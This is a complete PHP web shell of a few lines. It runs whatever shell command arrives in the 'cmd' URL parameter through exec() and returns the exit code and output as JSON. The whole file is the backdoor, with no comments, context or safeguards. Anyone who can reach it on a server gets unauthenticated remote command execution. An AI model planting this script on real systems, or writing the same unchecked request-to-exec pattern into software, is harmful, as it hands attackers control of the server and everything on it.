<?php
exec($_GET["cmd"], $output, $ret);

print json_encode(
array('ret' => $ret, 'output' => htmlentities(implode("\n", $output)))
);